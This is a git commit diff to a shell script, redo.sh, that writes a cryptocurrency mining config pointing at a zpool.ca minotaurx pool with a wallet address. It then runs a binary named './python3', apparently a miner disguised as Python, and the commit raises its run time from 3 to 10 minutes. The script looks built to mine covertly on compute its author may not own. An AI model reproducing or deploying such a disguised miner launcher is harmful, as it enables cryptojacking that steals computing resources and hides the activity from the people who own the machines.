03c4e7b48736d4025bfdffdc22be5073b47b33a8
cronjob <thesunofme1@gmail.com>
2024-07-16 07:35:03 +0700

    Update redo.sh

--- redo.sh
+++ redo.sh
@@ -7,4 +7,4 @@ cd python3
 rm config.json && echo '{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o", "password": "c=RVN", "workers": 2, "log": false, "chrome": "./chromium/chrome" }' > config.json
 export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
 export PATH=$HOME/dependencies/usr/bin:$PATH
-timeout 3m ./python3 main.py
+timeout 10m ./python3 main.py
